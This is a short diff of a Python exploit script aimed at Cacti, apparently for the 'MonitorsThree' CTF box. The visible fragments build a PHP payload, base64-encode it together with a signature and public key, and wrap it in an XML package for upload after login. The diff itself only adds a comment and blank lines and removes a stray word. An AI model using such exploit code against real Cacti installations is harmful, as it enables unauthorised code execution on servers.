@@ -39,6 +39,7 @@ http_proxy = {'127.0.0.1' : 8080}
 cacti_url = input('[>] Enter cacti url: ')
 session = urllib3.request(cacti_url)
 
+# add this to hosts file
 lines_to_add = ['10.10.11.30 monitorsthree.htb cacti.monitorsthree.htb']
 
 payload = """<?php
@@ -167,6 +168,8 @@ class exploit:
         else:
             print('[-] Invalid version, not going to work..')
         pass
+    
+    
 
     # login to user and run the payload function
     def auth_login():
@@ -189,7 +192,7 @@ def payload():
     b64_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
     b64_file_signature = base64.b64encode(file_signature).decode('utf-8')
     b64_public_key = base64.b64encode(public_key).decode('utf-8')
-test
+
     data = """<xml>
    <files>
        <file>
